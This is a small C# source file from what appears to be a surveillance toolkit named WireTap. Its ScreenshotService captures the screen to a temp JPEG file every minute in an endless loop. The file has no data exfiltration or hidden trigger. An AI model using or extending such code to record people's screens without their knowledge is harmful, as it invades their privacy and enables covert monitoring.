namespace WireTap.Service
{
    using System;
    using System.Threading.Tasks;

    internal class ScreenshotService : ServiceBase, IService
    {
        internal override async Task ExecuteAsync()
        {
            Console.WriteLine("ScreenshotService : StartScreenshotServiceAsync");

            while (true)
            {
                try
                {
                    Console.WriteLine("ScreenshotService : Inside captureScreenshot");
                    var tempFile = Helpers.CreateTempFileName(".jpeg", "screenshot-", "screenshot");
                    Display.CaptureImage(tempFile);
                    Console.WriteLine("ScreenshotService : [+] Screenshot captured at: {0}", tempFile);
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message + '\n' + ex.StackTrace);
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
            }
        }
    }
}